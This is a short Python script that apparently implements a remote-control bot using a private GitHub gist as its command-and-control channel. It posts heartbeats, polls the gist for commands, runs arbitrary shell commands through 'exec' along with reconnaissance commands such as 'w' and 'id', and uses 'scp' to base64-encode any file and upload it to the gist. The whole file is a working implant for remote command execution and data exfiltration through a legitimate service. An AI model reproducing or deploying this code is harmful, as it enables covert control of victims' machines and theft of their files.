from github import Github, InputFileContent
from threading import Thread
from dotenv import load_dotenv
from time import sleep, time
from subprocess import run, PIPE, STDOUT
from base64 import b64encode
from math import floor
from os import getenv

load_dotenv()
g = Github(getenv('GITHUB_TOKEN'))
me = g.get_user()

try:
  with open('gid.bot', 'r') as f:
    gist = g.get_gist(f.read())
except:
  gist = me.create_gist(False, {
    'heartbeat.md': InputFileContent(f'sup\n<!-- {floor(time())} -->'),
    'comm.md': InputFileContent(f'hi\n<!-- res temp -->')
  }, 'bsy-cc')

  with open('gid.bot', 'w') as f:
    f.write(gist.id)

def heartbeat():
  while True:
    try:
      gist.edit(files={
        'heartbeat.md': InputFileContent(f'sup\n<!-- {floor(time())} -->')
      })
      sleep(5)
    except:
      pass

Thread(target=heartbeat, daemon=True).start()

def send_resp(data: str):
  gist.edit(files={
    'comm.md': InputFileContent(f'hi\n<!-- res {data} -->')
  })

print('Bot is running...')
while True:
  try:
    comm = g.get_gist(gist.id).files.get('comm.md')
    if comm is not None and comm.content[8:11] == 'req':
      cmd = comm.content[12:-4].split(' ')
      if cmd[0] == 'ls':
        res = run(['ls', cmd[1]], stdout=PIPE, stderr=STDOUT)
        send_resp(res.stdout.decode('ascii'))
      elif cmd[0] == 'w':
        res = run(['w'], stdout=PIPE, stderr=STDOUT)
        send_resp(res.stdout.decode('ascii'))
      elif cmd[0] == 'id':
        res = run(['id'], stdout=PIPE, stderr=STDOUT)
        send_resp(res.stdout.decode('ascii'))
      elif cmd[0] == 'scp':
        try:
          with open(cmd[1], 'rb') as f:
            send_resp(b64encode(f.read()).decode('ascii'))
        except:
          send_resp('err')
          pass
      elif cmd[0] == 'exec':
        res = run(cmd[1:], stdout=PIPE, stderr=STDOUT)
        send_resp(res.stdout.decode('ascii'))
      else:
        send_resp('err')
    sleep(5)
  except:
    pass
